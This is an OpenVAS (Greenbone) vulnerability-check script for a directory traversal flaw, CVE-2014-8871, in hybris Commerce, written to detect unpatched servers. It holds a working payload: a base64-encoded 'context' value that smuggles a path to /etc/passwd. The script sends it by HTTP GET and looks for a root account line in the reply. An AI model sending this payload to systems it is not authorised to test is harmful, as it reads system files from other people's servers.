###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_hybris_dir_traversal_vuln.nasl 6211 2017-05-25 09:04:14Z teissa $
#
# hybris Commerce Directory Traversal Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105955");
  script_version("$Revision: 6211 $");
  script_tag(name : "last_modification", value : "$Date: 2017-05-25 11:04:14 +0200 (Thu, 25 May 2017) $");
  script_tag(name : "creation_date", value : "2015-02-25 14:49:12 +0700 (Wed, 25 Feb 2015)");
  script_tag(name : "cvss_base", value : "5.0");
  script_tag(name : "cvss_base_vector", value : "AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_cve_id("CVE-2014-8871");
  script_bugtraq_id(72681);

  script_name("hybris Commerce Directory Traversal Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);

  script_tag(name : "summary", value : "hybris Commerce Software Suite is vulnerable to a
directory traversal attack.");

  script_tag(name : "vuldetect", value : "Send a crafted exploit string via HTTP
GET request and check whether it is possible to access local files.");

  script_tag(name : "insight", value : "Webshops based on hybris may use an file retrieval
system where files are identified by a URL parameter named 'context' rather than a file
name. The context is base64 encoded and consists among other parameters the file name.
This file name is vulnerable to directory traversal.");

  script_tag(name : "impact", value : "An unauthenticated attacker can retrieve arbitray files
which might consist sensitive data which can be used for further attacks.");

  script_tag(name : "affected", value : "hybris Commerce Software Suite Releases 5.0.0, 5.0.3,
5.0.4, 5.1, 5.1.1, 5.2 and 5.3");

  script_tag(name : "solution", value : "Upgrade to Release 5.0.0.4, 5.0.3.4, 5.0.4.5, 5.1.0.2,
5.1.1.3, 5.2.0.4, 5.3.0.2 or higher.");

  script_xref(name : "URL", value : "https://www.redteam-pentesting.de/advisories/rt-sa-2014-016");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if (!port)
  port = 80;

if (!get_port_state(port))
  exit(0);

# base64 encoded "master|root|12345|text/plain|../../../../../../etc/passwd"
trav = 'bWFzdGVyfHJvb3R8MTIzNDV8dGV4dC9wbGFpbnwuLi8uLi8uLi8uLi8uLi8uLi9ldGMvcGFzc3dkfC0';
url = '/medias/?context=' + trav;

req = http_get(port:port, item:url);
res = http_keepalive_send_recv(port:port, data:req);

if (res && res =~ "root:.*:0:[01]:") {
  report = report_vuln_url( port:port, url:url );
  security_message(port:port, data:report);
  exit(0);
}

exit(0);
